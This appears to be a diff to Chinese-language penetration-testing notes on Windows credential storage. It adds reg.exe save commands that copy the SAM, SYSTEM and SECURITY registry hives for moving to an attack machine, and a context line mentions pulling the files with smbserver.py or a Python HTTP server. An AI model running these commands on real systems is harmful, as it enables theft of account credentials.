@@ -165,11 +165,18 @@ SAM文件，用于存储用户帐户凭证
   组策略对象 (Group policy objects)
   等等
 
+如果拥有本地管理员权限，可以复制三个注册表配置单元，将副本移动到攻击机上
+C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+
+C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+
+C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 
 
 
 
-reg.exe save hklm\sam C:\sam.save
+
+
 
   smbserver.py:  start a smb sever on attk host to pull .save, 
   like http sever:  python3 -m http.server
